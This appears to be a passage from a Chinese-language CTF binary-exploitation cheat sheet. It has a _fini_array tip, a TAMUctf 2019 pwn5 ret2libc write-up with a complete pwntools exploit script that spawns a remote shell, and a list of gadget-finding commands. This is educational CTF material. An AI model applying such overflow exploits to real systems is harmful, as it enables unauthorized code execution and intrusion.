**关键洞见：** `_fini_array` 在静态二进制中实际上是一个可重入的回调表。两个条目加上任何“写 N 字节到地址”的原语，能让你无限深度地构建 ROP 而无需重启进程。

**参考：** Insomnihack teaser 2019 — onewrite，writeup 12912

---
## 通过静态链接 libc + 嵌入的 /bin/sh 字符串实现 ret2libc（TAMUctf 2019）

**模式（pwn5）：** 参数被复制到一个固定大小的缓冲区，且有 3 字符的*显示*限制——但底层的 `gets()` 仍然读取整行，导致缓冲区后面溢出 17 字节。溢出空间太小，无法放下多 gadget 的 ROP 链，且在可预测地址没有明显的 `/bin/sh`。由于二进制是**静态链接**的，`system`、`exit` 和嵌入的 libc blob 中的 `"/bin/sh"` 字符串都位于固定地址——一个 ret2libc 调用正好适合溢出空间。

```python
from pwn import *

# 地址从静态二进制本身解析：
#   (gdb) info address system  -> 0x0804ee30
#   (gdb) info address exit    -> 0x0804e330
#   0x080bc140: "/bin/sh"              (从 rodata / libc blob 中提取)

system  = 0x0804ee30
exit_a  = 0x0804e330
binsh   = 0x080bc140

# 溢出到保存的 EIP，偏移为 cyclic 17（crash 时用 cyclic -l 确认）
payload  = cyclic(17)
payload += p32(system)   # ret -> system
payload += p32(exit_a)   # system 的返回地址 -> exit（避免 shell 后 SIGSEGV）
payload += p32(binsh)    # system 的第一个参数

# 通过管道 stdin 保持进程在 shell 启动后存活：
# (python -c "..."; cat) | nc pwn.tamuctf.com 4325
io = remote('pwn.tamuctf.com', 4325)
io.sendline(payload)
io.interactive()
```

**关键洞察：** 静态链接将每个 libc 符号变成二进制内固定偏移的目标，并且免费携带了整个 libc 字符串表（包括 `"/bin/sh"`）——无需泄露地址，无需 ROPgadget 寻找 `/bin/sh`，也无需动态链接器的操作。只要 `checksec` 显示 “No PIE” 且 `file` 报告 “statically linked”，通常一个 12 字节的 payload（`system; exit; &/bin/sh`）就足够了，即使溢出窗口太小无法放下 2-gadget 链。可通过 `strings -a binary | grep -n /bin/sh` 和 `nm binary | grep ' T system'` 进行确认。

**参考：** TAMUctf 2019 — pwn5，writeup 13428

---

## 常用命令

```bash
one_gadget libc.so.6           # 查找 one-shot gadgets
ropper -f binary               # 查找 ROP gadgets
ROPgadget --binary binary      # 另一种 gadget 查找工具
seccomp-tools dump ./binary    # 检查 seccomp 规则
```
